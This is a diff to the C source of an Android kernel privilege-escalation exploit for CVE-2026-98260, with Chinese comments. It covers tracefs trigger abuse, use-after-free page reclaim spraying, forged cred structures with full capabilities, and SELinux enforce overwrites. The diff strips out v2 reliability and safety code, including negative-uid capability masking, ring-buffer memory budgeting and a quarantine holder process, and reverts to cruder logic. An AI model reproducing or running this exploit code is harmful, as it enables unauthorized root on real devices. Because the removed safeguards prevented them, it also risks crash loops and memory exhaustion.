@@ -7,7 +7,6 @@
  */
 
 #define _GNU_SOURCE 1
-#include <dirent.h>
 #include <errno.h>
 #include <fcntl.h>
 #include <inttypes.h>
@@ -21,9 +20,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
-#include <sys/stat.h>
 #include <sys/mman.h>
-#include <sys/resource.h>
 #include <sys/syscall.h>
 #include <sys/time.h>
 #include <sys/wait.h>
@@ -33,7 +30,6 @@
 // get offset table from kernel_table.c
 #include "kernel_table.h"
 #include "rawscan.h"
-#include "memguard.h"
 
 /*
  * rootd control surface (implemented in pc98260_rootd.c).
@@ -99,20 +95,7 @@ static uint32_t CRED_OFF_SELINUX, CRED_OFF_ROOT_USER;
 static uint32_t CRED_OFF_USER_NS, CRED_OFF_UCOUNTS, CRED_OFF_GROUPS;
 
 static uint64_t g_slide = UINT64_C(0);
-/*
- * 伪造 cred 的 capability 集合。
- *
- * 原本用内核的 CAP_FULL_SET（0x1ffffffffff，41 位）。但这一页种下去之后是要
- * 被释放、被复用的：一旦被 cred_jar 拿去给别的进程用，cap 槽里的低 32 位
- * （0xffffffff，bit31 置位）就可能被读成 uid —— 又是一个「负 userId」来源，
- * 和整页散弹那条路殊途同归。
- *
- * 这里收到 0x7fffffff（bit 0..30）：把 bit31 清掉，即使被误读成 uid 也只会
- * 读出正数。代价是丢掉 CAP_SETFCAP(31) 及其以上的位（CAP_MAC_ADMIN /
- * CAP_SYSLOG / CAP_BPF / CAP_CHECKPOINT_RESTORE 等）—— 本利用链用不到它们：
- * mount / chroot / setuid / tracefs 全在 bit30 以内。
- */
-#define FULLCAP UINT64_C(0x7fffffff)
+#define FULLCAP UINT64_C(0x1ffffffffff)
 
 /* $CVE98260_HOME 下读一个 "0x..." 结果文件（calib_a 落盘的运行期调用点）。 */
 static uint64_t read_site_file(const char *name)
@@ -277,47 +260,18 @@ static void log_sync(void)
 	(void)fdatasync(STDOUT_FILENO);
 }
 
-/*
- * 把任务的 RSS 计数推过 TASK_RSS_EVENTS_THRESH，触发 kmem/rss_stat 事件。
- *
- * ⚠️ 原来这里只 touch **一个** 4 KiB 页（RSS +1）。rss_stat 是**边沿触发**，
- * 事件的 enable 状态只有在 rss_stat 真正触发时才会被翻转 —— 而
- * kmem_cache_alloc 的 enable 是靠 trigger 间接开的（uid 2000 直接写
- * events 下的 enable 文件在真机上被拒：日志里 `armed=trigger enable=?`，
- * 写失败、读也读不回来）。
- * 于是单页 bump 很可能**够不着阈值** → 事件从未 enable → 环形缓冲里一条记录
- * 都没有 → `[uaf] captured=0 chosen=0 raw=0`。
- *
- * 这就是「有时能采到、有时采不到」的间歇性来源：RSS 计数离阈值远近不同，
- * 结果随机。leak_task() 这种「arm 完立刻 fork、马上读」的最短路径最容易中招
- * （calib_a 里 timer probe 会持续 bump RSS，阈值迟早被跨过，所以 calib 反而没事）。
- *
- * → 一次 bump 256 页（1 MiB）并重复若干轮，把计数稳稳推过阈值；
- *   munmap 会把 RSS 减回去，但事件是边沿触发，enable 状态一旦翻过来就保持。
- */
-#define RSS_BUMP_PAGES  256
-#define RSS_BUMP_ROUNDS 4
-
 static int kick_rss(void)
 {
-	size_t sz = (size_t)RSS_BUMP_PAGES * 4096;
-	unsigned char *pages;
-	int rc = 0;
-
+	unsigned char *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
+				   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 	if (write_file(TRACE "/events/kmem/rss_stat/enable", "1\n"))
 		return -1;
-	pages = mmap(NULL, sz, PROT_READ | PROT_WRITE,
-		     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-	if (pages == MAP_FAILED) {
-		rc = -1;
-	} else {
-		for (int r = 0; r < RSS_BUMP_ROUNDS; r++)
-			for (size_t i = 0; i < sz; i += 4096)
-				pages[i] = (unsigned char)(i + (size_t)r);
-		munmap(pages, sz);
+	if (page != MAP_FAILED) {
+		((volatile unsigned char *)page)[0] = 1;
+		munmap(page, 4096);
 	}
 	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
-	return rc;
+	return 0;
 }
 
 /*
@@ -366,12 +320,6 @@ static void report_arm(const char *mode)
 	v[strcspn(v, "\r\n")] = '\0';
 	dprintf(STDOUT_FILENO, "[trace] kmem_cache_alloc armed=%s enable=%s\n",
 		mode, v);
-	/*
-	 * 立刻落盘。设备若在这一步之后 panic（别的机型套错偏移就可能这样），
-	 * 日志文件里必须已经有这一行 —— 否则崩溃前的最后一步会随 page cache
-	 * 一起丢掉，我们只能拿到一个「没有日志」。
-	 */
-	log_sync();
 }
 
 static int arm_kmem_cache_alloc(void)
@@ -443,634 +391,40 @@ static uint64_t object_pfn(uint64_t ptr)
 	return ((ptr & ~UINT64_C(0xfff)) - g_page_offset) >> 12;
 }
 
-/*
- * 注入阶段的总时间预算（秒）与截止时刻。
- *
- * 见 uaf_plant_main 里两轮重试循环的注释：没有预算的话，最坏能跑 30 多分钟，
- * 宿主那边早就超时判失败了，用户只会看到「卡死」。
- */
-#define EXPLOIT_BUDGET_SEC 240
-
-/*
- * SELinux 阶段的独立上限：轮数 + 墙钟秒数。
- *
- * 真机 alpha06 日志：SELinux 阶段 12 轮 × ~16 s ≈ 192 s，把 240 s 总预算
- * 吃掉 80%，轮到 cred 阶段只剩 ~48 s —— cred 阶段只跑了 1 轮就被
- * "[budget] cred phase stopped after 1 attempt(s): time budget 240 s exhausted"
- * 掐掉。而 cred 阶段才是真正做提权的那一段：SELinux 没关掉也能靠伪造 cred
- * 拿到 root。所以这个阶段必须**让出**预算给 cred，而不是把预算烧光。
- *
- * 同时这一段本来就是「低成功率 + 低收益」的：它要的是把 enforce 写成 0，
- * 而真机上 12 轮全败（每次都是 "[SELinux] enforce=1"）。轮数压到 4 轮、
- * 60 s 墙钟，比原来少烧 130 s。
- */
-#define SELINUX_PHASE_MAX_ATTEMPTS 4
-#define SELINUX_PHASE_MAX_SEC 60
-
-/* 为 cred 阶段预留的秒数：SELinux 阶段必须在此之前收手。 */
-#define CRED_PHASE_RESERVE_SEC 150
-
-/* cred 阶段最多几轮（每轮 ~6–8 s，实际受总预算约束）。 */
-#define CRED_PHASE_MAX_ATTEMPTS 12
-
-/*
- * 失败标记（机器可读）。
- *
- * 宿主在等 rootd 就绪时盯着这个标记：原生体自己放弃时就立刻返回失败，
- * 而不是空等满 300 s（真机实测：原生体 08:44:14 就已经放弃了，宿主
- * 08:46:28 才报超时，中间白等 134 s）。
- */
-#define EXPLOIT_FAILED_MARKER "C98260_EXPLOIT_FAILED=1"
-
-/*
- * 连续多少轮打不中就提前收手。
- *
- * 真机上一轮 12/12 全败（每轮 ~5.8 s），SELinux 阶段 + cred 阶段加起来
- * 白等 ~70 s，最后还是同一个结论。连续失败到阈值就收手，把时间还给用户。
- */
-#define CONSEC_FAIL_MAX 8
-static time_t g_deadline;
-
-/** 预算是否已经用完（未设置截止时刻时不算用完）。 */
-static int budget_exhausted(void)
-{
-	return g_deadline != 0 && time(NULL) >= g_deadline;
-}
-
 static int cpu_count(void);
 
-/*
- * v1 的 trace_seen（逐行 fgets 扫 8 个 CPU 的 per_cpu trace 文本）已被
- * trace_find_pfn() 取代：后者整块 read + memmem，能顺带解析 order=，
- * 并且在装了 pfn 过滤器之后 ring 里只剩目标页的记录，单次几毫秒。
- */
-
-/* ===================== v2 回收链路 ===================== */
-
-/*
- * 【v2 回收链路】针对真机连败 5 轮（每轮 writes=1999 hit=0）的复盘与修法。
- *
- * 日志事实：每一轮都以 hit=0 收尾 —— 受害者页在整个喷洒窗口里一次都没被
- * 重新分配。卡点不在提权/伪造（那两段根本没开始），而在「让受害者页回到
- * 一块我们能写内容的页」这一步。v1 的四个结构性问题，逐个处理：
- *
- * (1) 命中判定慢到把整轮时间吃光
- *     v1 每 200 次写就把 8 个 CPU 的 per_cpu/cpuN/trace（每核 30 MB 文本）
- *     逐行 fgets 一遍，单次 ~0.3 s → 一轮 ~3.6 s，12 轮 ≈ 45 s。
- *     v2 给 mm_page_* 装 pfn 过滤器（ring 里只剩目标页的记录），扫描改成
- *     整块 read + memmem，单次几 ms；判定密度也从「每 200 写」提到
- *     「每 16 写」。
- *
- * (2) 从 free 到喷洒的窗口太长
- *     受害者页被 free 后进的是**释放它的那个 CPU 的 per-CPU 空闲链**，稍晚
- *     就可能被别的子系统拿走，或被 buddy 合并成更大的块再也回不来。
- *     v2：free 事件一出现就喷（15 ms 轮询），先把写打在释放者所在的核
- *     （race_cpu）上，再轮转其它核。
- *
- * (3) 受害者页的 pfn 是猜的
- *     v1: base = object_pfn(vnode) & ~1（假定 slab 是 8 KiB 复合页），命中
- *     判定又是 pfn 精确相等 —— 一旦这台机器的 slab 是 4 KiB(order-0)，
- *     base 指向的就是邻居页：喷的和找的都不是受害者页。
- *     v2 直接从 mm_page_free 记录读出内核报出来的真实 pfn 与 order，铺页
- *     落点按 order 算，命中判定用真实 pfn。
- *
- * (4) 喷洒原语与受害者页的阶（order）可能对不上
- *     v1 只有一种原语：8 KiB 写进 AF_UNIX socket。受害者页是 order-0 时，
- *     这条路径分配的根本不是 order-0 的页，取不回来。
- *     v2：order=0 额外走 pipe（页缓冲就是 order-0 的页，1:1 字节映射），
- *     并让块大小在 4 KiB / 8 KiB / 16 KiB 之间轮转，覆盖不同的分配阶；
- *     同时把分配侧的 order 直方图打出来 —— 这正是本次卡死最需要的那个数。
- *
- * 负 uid 防护（用户明确要求「尽量避免负值 uid」）：
- *   铺页把内核地址写进了 socket / pipe 的页缓冲。这些页一旦回到 buddy，
- *   就可能被 cred_jar 领走，struct cred.uid（偏移 8）落在某个内核地址槽上
- *   → system_server 读到负 userId → 每分钟一次的崩溃循环（软重启清不掉，
- *   须完整内核重启）。v2 三处收口：
- *     a) 命中后 fork 一个「持有者」进程，一直不 close 这些 fd → 铺过的页
- *        永远归 slab 所有，cred slab 拿不到；
- *     b) 伪造 cred 的 cap 值从 0x1ffffffffff 降到 0x7fffffff（去掉 bit31），
- *        这样「cap 槽被 uid 槽读到」也只会读出正数；
- *     c) 每轮打印本次铺进页里的值有没有「低 32 位最高位 = 1」的（= 负 uid
- *        风险位），有就明确告警，提醒必须完整重启。
- */
-
-/*
- * 读一个 per-CPU trace 文件到内存（返回长度，buf 由调用方释放）。
- *
- * ⚠️ 必须循环读满：tracefs 的 per_cpu/cpuN/trace 是 seq_file，一次 read()
- * 未必把整个文件搬上来。老代码只 read() 一次就当读全了 —— 文件一大就等于
- * 只看了头部，而 ring 里最新的记录全在尾部，于是「刚发生的 free/alloc」
- * 一条都看不到（命中判定因此恒为假）。
- */
-static ssize_t read_trace_file(const char *path, char **buf_out)
+static int pfn_in_line(const char *line, uint64_t pfn)
 {
-	int fd;
-	struct stat st;
-	char *buf;
-	size_t want;
-	ssize_t got = 0;
-
-	*buf_out = NULL;
-	fd = open(path, O_RDONLY | O_CLOEXEC);
-	if (fd < 0)
-		return -1;
-	if (fstat(fd, &st) || st.st_size <= 0 ||
-	    st.st_size > (256L << 20)) {
-		close(fd);
-		return -1;
-	}
-	want = (size_t)st.st_size;
-	buf = malloc(want + 1);
-	if (!buf) {
-		close(fd);
-		return -1;
-	}
-	while ((size_t)got < want) {
-		ssize_t n = read(fd, buf + got, want - (size_t)got);
-
-		if (n <= 0)
-			break;
-		got += n;
-	}
-	close(fd);
-	if (got <= 0) {
-		free(buf);
-		return -1;
-	}
-	buf[got] = '\0';
-	*buf_out = buf;
-	return got;
-}
-
-/*
- * 在一段 trace 文本里找一条 "… mm_page_alloc: pfn=1234 order=0 …" 记录。
- * 整块 read + memmem 取代逐行 fgets：命中判定要放进喷洒循环里反复调用，
- * 逐行解析在 30 MB/核的 ring 上一次就要几百毫秒。
- *
- * ⚠️⚠️ 内核把 pfn 按**十进制**打印（mm_page_alloc / mm_page_free 的
- * TP_printk 是 "pfn=%lu"，见 kernel/trace/events/kmem.h）。老代码按十六进制
- * 拼 needle（"pfn=0x%llx"），于是一个记录都匹配不到 ——
- * free_seen 恒为 0、hit 恒为 0，整条回收链的两个真判定从来没生效过
- * （真机 alpha05 日志：12/12 轮全部 "writes=2387 hit=0 ... events_live=0"）。
- * 现在十进制 / 十六进制都试，并要求数字后面不能再跟数字位
- * （避免 pfn=123 误命中 pfn=1234）。
- */
-static int pfn_needle_hit(char *buf, ssize_t len, const char *kind,
-			  const char *needle, int *order_out)
-{
-	char *p, *end = buf + len;
-	size_t klen = strlen(needle);
-
-	for (p = buf;
-	     (p = memmem(p, (size_t)(end - p), needle, klen)) != NULL;
-	     p++) {
-		char *line = p, *eol;
-		char *q = p + klen;
-
-		/* 数字边界：后面不能再跟数字位 / 十六进制位。 */
-		if (q < end && ((*q >= '0' && *q <= '9') ||
-				(*q >= 'a' && *q <= 'f') ||
-				(*q >= 'A' && *q <= 'F')))
-			continue;
-		while (line > buf && line[-1] != '\n')
-			line--;
-		eol = strchr(p, '\n');
-		if (!eol)
-			eol = end;
-		if (!strstr(line, kind))
-			continue;
-		if (order_out) {
-			char *op = strstr(line, "order=");
-			*order_out = op ? atoi(op + 6) : -1;
-		}
-		return 1;
-	}
-	return 0;
-}
-
-/* 在一段 trace 文本里找 pfn 匹配的记录（十进制 + 十六进制两种写法）。 */
-static int trace_find_pfn_in_buf(char *buf, ssize_t len, const char *kind,
-				 uint64_t pfn, int *order_out)
-{
-	char needle[48];
-
-	snprintf(needle, sizeof(needle), "pfn=%llu", (unsigned long long)pfn);
-	if (pfn_needle_hit(buf, len, kind, needle, order_out))
-		return 1;
-	snprintf(needle, sizeof(needle), "pfn=0x%llx", (unsigned long long)pfn);
-	return pfn_needle_hit(buf, len, kind, needle, order_out);
-}
-
-/* 扫全部 CPU 的 ring（找不到返回 0）。 */
-static int trace_find_pfn(const char *kind, uint64_t pfn, int *order_out)
-{
-	char path[128];
-	int ncpu = cpu_count();
-	int cpu;
-
-	for (cpu = 0; cpu < ncpu; cpu++) {
-		char *buf;
-		ssize_t len;
-		int found;
-
-		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
-		len = read_trace_file(path, &buf);
-		if (len <= 0)
-			continue;
-		found = trace_find_pfn_in_buf(buf, len, kind, pfn, order_out);
-		free(buf);
-		if (found)
-			return 1;
-	}
-	return 0;
-}
-
-/*
- * 只扫一个 CPU 的 ring。
- *
- * 受害者页被 free 之后待在**释放它那个核**的 per-CPU 空闲链里，能重新拿到
- * 它的分配也只发生在那个核上 —— 所以喷洒窗口内先只看释放者核：文本量是
- * 全核的 1/8，判定耗时跟着降一个数量级（真机一轮从 ~5.8 s 降到 ~2 s）。
- */
-static int trace_find_pfn_on_cpu(const char *kind, uint64_t pfn, int *order_out,
-				 int cpu)
-{
-	char path[128];
-	char *buf;
-	ssize_t len;
-	int found;
-
-	snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
-	len = read_trace_file(path, &buf);
-	if (len <= 0)
+	const char *p = strstr(line, "pfn=0x");
+	char *end = NULL;
+	uint64_t got;
+	if (!p)
 		return 0;
-	found = trace_find_pfn_in_buf(buf, len, kind, pfn, order_out);
-	free(buf);
-	return found;
-}
-
-/* 统计 8 个 CPU 的 trace 里 kind 出现的次数（诊断用）。 */
-static long trace_count_kind(const char *kind)
-{
-	char path[128];
-	long total = 0;
-	int ncpu = cpu_count();
-	int cpu;
-
-	for (cpu = 0; cpu < ncpu; cpu++) {
-		char *buf, *p, *end;
-		ssize_t len;
-
-		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
-		len = read_trace_file(path, &buf);
-		if (len <= 0)
-			continue;
-		end = buf + len;
-		for (p = buf;
-		     (p = memmem(p, (size_t)(end - p), kind, strlen(kind))) != NULL;
-		     p++)
-			total++;
-		free(buf);
-	}
-	return total;
-}
-
-/* 只统计某一个 CPU 的 trace 里 kind 出现的次数（探针用，省一次全核扫）。 */
-static long trace_count_kind_on_cpu(const char *kind, int cpu)
-{
-	char path[128];
-	char *buf, *p, *end;
-	long total = 0;
-	ssize_t len;
-
-	snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
-	len = read_trace_file(path, &buf);
-	if (len <= 0)
+	got = strtoull(p + 6, &end, 16);
+	if (end == p + 6)
 		return 0;
-	end = buf + len;
-	for (p = buf;
-	     (p = memmem(p, (size_t)(end - p), kind, strlen(kind))) != NULL;
-	     p++)
-		total++;
-	free(buf);
-	return total;
+	return got == pfn;
 }
 
-/*
- * mm_page_alloc / mm_page_free 所在的 tracefs 事件组（运行期自发现）。
- *
- * 为什么不能写死 "kmem"：这两个 tracepoint 在不同内核版本里换过归属
- * （老内核在 kmem 组，新内核挪到了 mm 组）。写死组名时 open() 直接 ENOENT
- * —— 看上去像「权限被拒」，其实是路径根本不存在，于是事件永远开不了火，
- * 命中判定退化成「看不见 == 没有」，每一轮都白喷 6 秒。
- *
- * 真机症状（Xiaomi M154FF / 6.18.21-android17）：同一台机器上
- * kmem_cache_alloc 用 "kmem" 组能开火（armed=trigger），而 mm_page_alloc
- * 用 "kmem" 组怎么开都不动 —— 组名对不上。
- */
-static char g_page_group_alloc[64];
-static char g_page_group_free[64];
-
-/* 事件是否真的开火了。0 = 判定不可信（看不见 ring 里有没有目标页的记录）。 */
-static int g_page_events_live;
-
-/*
- * 找出 event 可能所在的**所有**组名（写入 out，返回个数）。
- *
- * mm_page_alloc / mm_page_free 在不同内核里换过归属（kmem / mm / mm_events /
- * page_alloc 都出现过）。而 enable_event:<组>:<事件> 是**按名字查事件**的：
- * 组名不对就静默失败，事件永远开不了火。
- *
- * 关键：events/<组>/<事件>/enable 这个文件存在，**不等于**事件注册在那个组里
- * （同一事件名可能在多个组下都留着目录）。所以这里把所有候选组都收上来，让
- * arm 阶段逐个挂一遍 —— 挂错的组只是写了一条没人认的命令（无害），挂对的
- * 那个才会真的把事件打开。
- *
- * 真机症状（Xiaomi M154FF / 6.18.21-android17）：kmem_cache_alloc 用 "kmem"
- * 组能开火（armed=trigger），而 mm_page_alloc 用 "kmem" 组怎么开都不动。
- */
-static int find_event_groups(const char *event, char out[][64], int max)
+static int trace_seen(const char *kind, uint64_t pfn)
 {
-	static const char *known[] = { "kmem", "mm", "mm_events", "page_alloc" };
-	DIR *d;
-	struct dirent *de;
-	size_t i;
-	int n = 0;
-
-	/* 先试常见组名：命中就直接用（省掉一次目录扫描）。 */
-	for (i = 0; i < sizeof(known) / sizeof(known[0]) && n < max; i++) {
-		char path[192];
-
-		snprintf(path, sizeof(path), TRACE "/events/%s/%s/enable",
-			 known[i], event);
-		if (access(path, F_OK) == 0)
-			snprintf(out[n++], 64, "%s", known[i]);
-	}
-	/* 再全量扫 events/ 目录（组名被改过时的兜底）。 */
-	d = opendir(TRACE "/events");
-	if (!d)
-		return n;
-	while ((de = readdir(d)) != NULL && n < max) {
-		char path[192];
-		int dup = 0;
-
-		if (de->d_name[0] == '.')
+	int ncpu = cpu_count();
+	for (int cpu = 0; cpu < ncpu; cpu++) {
+		char path[128], line[768];
+		FILE *file;
+		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
+		file = fopen(path, "r");
+		if (!file)
 			continue;
-		snprintf(path, sizeof(path), TRACE "/events/%s/%s/enable",
-			 de->d_name, event);
-		if (access(path, F_OK) != 0)
-			continue;
-		for (i = 0; i < (size_t)n; i++)
-			if (!strcmp(out[i], de->d_name)) {
-				dup = 1;
-				break;
+		while (fgets(line, sizeof(line), file)) {
+			if (strstr(line, kind) && pfn_in_line(line, pfn)) {
+				fclose(file);
+				return 1;
 			}
-		if (dup)
-			continue;
-		snprintf(out[n++], 64, "%s", de->d_name);
-	}
-	closedir(d);
-	return n;
-}
-
-/*
- * 给事件装 pfn 过滤器：ring 里只留目标页的记录。
- * 两个作用：(a) 扫描量从 240 MB 掉到几 KB；(b) mm_page_alloc 是热点事件，
- * 不加过滤会被冲掉 ring —— 冲掉就再也找不到目标页的 alloc 记录，
- * 又是一次「假阴性」（v1 每轮 hit=0 的另一个可能来源）。
- */
-static int set_pfn_filter(const char *group, const char *event, uint64_t p1,
-			   uint64_t p2)
-{
-	char path[160], expr[160];
-
-	snprintf(path, sizeof(path), TRACE "/events/%s/%s/filter", group, event);
-	if (p2 && p2 != p1)
-		snprintf(expr, sizeof(expr), "pfn == %#llx || pfn == %#llx",
-			 (unsigned long long)p1, (unsigned long long)p2);
-	else
-		snprintf(expr, sizeof(expr), "pfn == %#llx",
-			 (unsigned long long)p1);
-	return write_file(path, expr);
-}
-
-/* 清掉上一轮留下的 pfn 过滤器（过滤器是事件级属性，不会随事件 disable 消失）。 */
-static void reset_page_filters(void)
-{
-	if (g_page_group_alloc[0]) {
-		char path[192];
-
-		snprintf(path, sizeof(path), TRACE "/events/%s/mm_page_alloc/filter",
-			 g_page_group_alloc);
-		write_file(path, "0\n");
-	}
-	if (g_page_group_free[0]) {
-		char path[192];
-
-		snprintf(path, sizeof(path), TRACE "/events/%s/mm_page_free/filter",
-			 g_page_group_free);
-		write_file(path, "0\n");
-	}
-}
-
-/*
- * 打开一个 mm_page_* 事件。三条路依次尝试，每条都记 errno：
- *   1. 直接写 events/<组>/<事件>/enable —— 最稳；
- *   2. 写 set_event（"<组>:<事件>"）—— 直写被拒时的正规入口；
- *   3. rss_stat trigger 的 enable_event:<组>:<事件> + kick_rss —— 兜底。
- * 返回 0 = 至少一条路写入成功（**不代表事件真的开火**，仍要 probe 复核）。
- *
- * ⚠️ 无论走哪条路都要 kick 一次 rss_stat：
- *   · 触发器只有被 rss_stat 命中才会去开目标事件，不 kick 就等于没开；
- *   · trigger 的写入返回值不可靠 —— SELinux 对 open 的处理会让 write 返回
- *     非 0，但触发器照样生效（同一份 CVE-2026-98260 移植手册里明确写了这点），
- *     所以「写失败」不能当成「没挂上」。
- */
-static int arm_one_page_event(const char *event, const char *group)
-{
-	char path[192], cmd[160];
-	int mode = 0, e1 = 0, e2 = 0, e3 = 0;
-
-	snprintf(path, sizeof(path), TRACE "/events/%s/%s/enable", group, event);
-	if (!write_file(path, "1\n")) {
-		mode = 1;
-	} else {
-		e1 = errno;
-		snprintf(path, sizeof(path), TRACE "/set_event");
-		snprintf(cmd, sizeof(cmd), "%s:%s\n", group, event);
-		if (!write_file(path, cmd)) {
-			mode = 2;
-		} else {
-			e2 = errno;
-			snprintf(cmd, sizeof(cmd), "enable_event:%s:%s\n", group, event);
-			if (!trigger_cmd(cmd))
-				mode = 3;
-			else
-				e3 = errno;
 		}
+		fclose(file);
 	}
-	kick_rss();
-	dprintf(STDOUT_FILENO,
-		"[trace] %s group=%s arm=%s errno(direct=%d set_event=%d trigger=%d)\n",
-		event, group,
-		mode == 1 ? "direct" : mode == 2 ? "set_event" :
-		mode == 3 ? "trigger" : "failed", e1, e2, e3);
-	return mode ? 0 : -1;
-}
-
-/*
- * 回读 rss_stat 的 trigger 文件，把挂上去的命令打出来。
- *
- * enable_event 命令是**累积**的：写进去的命令都留在文件里，命中时逐条执行。
- * 之前「事件开不了火」查不出根因，就是因为没人回读过这个文件 —— 只看得到
- * 「写成功/写失败」，看不到「到底挂上几条命令、分别是什么」。
- */
-static void dump_rss_trigger(void)
-{
-	char buf[1024];
-	ssize_t n;
-	char *p;
-	int fd = open(TRIGGER, O_RDONLY | O_CLOEXEC);
-
-	if (fd < 0) {
-		dprintf(STDOUT_FILENO, "[trace] rss_stat trigger read errno=%d\n",
-			errno);
-		return;
-	}
-	n = read(fd, buf, sizeof(buf) - 1);
-	close(fd);
-	if (n <= 0) {
-		dprintf(STDOUT_FILENO, "[trace] rss_stat trigger empty errno=%d\n",
-			errno);
-		return;
-	}
-	buf[n] = '\0';
-	for (p = buf; *p; p++)
-		if (*p == '\n')
-			*p = '|';
-	dprintf(STDOUT_FILENO, "[trace] rss_stat trigger: %s", buf);
-}
-
-/*
- * 打开 mm_page_alloc / mm_page_free（组名运行期自发现）。
- *
- * 所有候选组都挂一遍（见 find_event_groups 的注释）：挂错的组无害，
- * 挂对的组才会真的开火。
- * 返回值：成功 arm 的事件个数。
- */
-static int arm_page_events(void)
-{
-	int ok = 0;
-	char groups[8][64];
-	int n, i;
-
-	n = find_event_groups("mm_page_alloc", groups, 8);
-	g_page_group_alloc[0] = '\0';
-	for (i = 0; i < n; i++) {
-		if (!g_page_group_alloc[0])
-			snprintf(g_page_group_alloc, sizeof(g_page_group_alloc),
-				 "%s", groups[i]);
-		if (!arm_one_page_event("mm_page_alloc", groups[i]))
-			ok++;
-	}
-	if (!n)
-		dprintf(STDOUT_FILENO,
-			"[trace] mm_page_alloc not found under " TRACE "/events/*\n");
-
-	n = find_event_groups("mm_page_free", groups, 8);
-	g_page_group_free[0] = '\0';
-	for (i = 0; i < n; i++) {
-		if (!g_page_group_free[0])
-			snprintf(g_page_group_free, sizeof(g_page_group_free),
-				 "%s", groups[i]);
-		if (!arm_one_page_event("mm_page_free", groups[i]))
-			ok++;
-	}
-	if (!n)
-		dprintf(STDOUT_FILENO,
-			"[trace] mm_page_free not found under " TRACE "/events/*\n");
-	dump_rss_trigger();
-	return ok;
-}
-
-/*
- * 自检：mm_page_alloc/free 到底开着没有？
- * 分配 + 释放一个匿名页，看 trace 里有没有对应记录。
- * 没有 → 后面所有「没命中」都是假阴性。
- *
- * 只扫「做 mmap/munmap 的那个核」+ 兜底全核：探针自己的记录就在那两个核上，
- * 全核扫一遍在 30 MB/核 的 ring 上要几百毫秒，而每轮都要做一次。
- */
-static int probe_page_events(void)
-{
-	void *p;
-	struct timespec nap = { .tv_nsec = 60 * 1000 * 1000 };
-	long a, f;
-	int cpu_alloc = -1, cpu_free = -1;
-
-	p = mmap(NULL, 65536, PROT_READ | PROT_WRITE,
-		 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-	if (p == MAP_FAILED)
-		return -1;
-	((volatile unsigned char *)p)[0] = 1;
-	cpu_alloc = sched_getcpu();
-	nanosleep(&nap, NULL);
-	munmap(p, 65536);
-	cpu_free = sched_getcpu();
-	nanosleep(&nap, NULL);
-	a = 0;
-	f = 0;
-	if (cpu_alloc >= 0)
-		a = trace_count_kind_on_cpu("mm_page_alloc:", cpu_alloc);
-	if (cpu_free >= 0)
-		f = trace_count_kind_on_cpu("mm_page_free:", cpu_free);
-	if ((a <= 0 || f <= 0) && cpu_alloc >= 0) {
-		/* 探针记录可能被冲掉或落在别的核上：退回全核扫一次。 */
-		a = trace_count_kind("mm_page_alloc:");
-		f = trace_count_kind("mm_page_free:");
-	}
-	/*
-	 * 把探针计数打出来：「事件没开火」是整条回收链最关键的一个分叉点，
-	 * 只打一句 WARN 没法区分是「事件没开」还是「开了但读不到」。
-	 */
-	dprintf(STDOUT_FILENO,
-		"[reclaim] probe mm_page_alloc=%ld mm_page_free=%ld (cpu_alloc=%d cpu_free=%d)\n",
-		a, f, cpu_alloc, cpu_free);
-	return (a > 0 && f > 0) ? 0 : -1;
-}
-
-/*
- * 铺过的页不释放：fork 一个持有者，把这些 fd 留在它手里。
- * 父进程退出后（daemon-exit 模型）页仍然归 slab 所有 → cred slab 拿不到
- * → 不会再出现「脏 cred → 负 uid → system_server 崩溃循环」。
- */
-static void quarantine_hold(void)
-{
-	pid_t p = fork();
-	int devnull;
-
-	if (p < 0)
-		return;
-	if (p != 0)
-		return;
-	/* 子进程：唯一的职责是让这些 fd 不被 close。 */
-	devnull = open("/dev/null", O_RDWR | O_CLOEXEC);
-	if (devnull >= 0) {
-		dup2(devnull, STDOUT_FILENO);
-		dup2(devnull, STDERR_FILENO);
-		if (devnull > STDERR_FILENO)
-			close(devnull);
-	}
-	setsid();
-	for (;;)
-		pause();
-	_exit(0);
-}
-
-/* 低 32 位最高位为 1 → 被 cred 的 uid 槽读到就是负 userId。 */
-static int uid_risky_value(uint64_t v)
-{
-	return (int)(((uint32_t)v >> 31) & 1u);
+	return 0;
 }
 
 static int cpu_count(void)
@@ -1101,102 +455,6 @@ static int cpu_count(void)
 	if (n < 1)
 		return 8;
 	return n > 16 ? 16 : n;
-}
-
-/* ---------------- trace 环形缓冲的内存预算 + 兜底还原 ----------------
- *
- * buffer_size_kb 是**内核全局设置**：进程退出、被杀、崩溃都不会还原。
- * 旧代码把喷洒阶段的 per-CPU 环形缓冲写死 64 MiB（8 核 = 512 MiB 内核内存），
- * 而且：
- *   · 全程不看设备有多少内存（全仓没有任何 /proc/meminfo 读取）；
- *   · 还原只发生在 disarm() / quiet_reclaim_trace() 两个地方，
- *     而失败路径大多直接 return -1 走掉了 —— 缓冲停在高位；
- *   · 没有 atexit、没有信号处理，进程被杀 = 永久泄漏。
- *
- * 一轮失败就可能把 128 MiB（16 MiB/CPU × 8）永久钉在内核里，反复重试 →
- * 设备可用内存越来越低 → 卡死 → watchdog 重启。这与「同内核、别人跑就卡死
- * 重启、反复重试反复卡」的现象一致，而且和机型/内存大小强相关。
- *
- * 这里做三件事：
- *   1) 按 /proc/meminfo 的 MemTotal 给每 CPU 环形缓冲算预算（memguard.c，
- *      纯计算，有宿主单测）；
- *   2) 所有失败路径都还原；
- *   3) 进程退出（atexit）与可捕获信号都还原。
- */
-
-/* 设备总内存（KB）。0 = 读不到（未知）。 */
-static uint64_t g_mem_total_kb;
-
-static uint64_t read_mem_total_kb(void)
-{
-	char buf[4096];
-	ssize_t n;
-	int fd = open("/proc/meminfo", O_RDONLY | O_CLOEXEC);
-	uint64_t kb;
-
-	if (fd < 0)
-		return 0;
-	n = read(fd, buf, sizeof(buf) - 1);
-	close(fd);
-	if (n <= 0)
-		return 0;
-	buf[n] = '\0';
-	kb = memguard_parse_memtotal_kb(buf);
-	return kb;
-}
-
-/* 按设备内存算出这个阶段每 CPU 该用多少 KB 的环形缓冲。 */
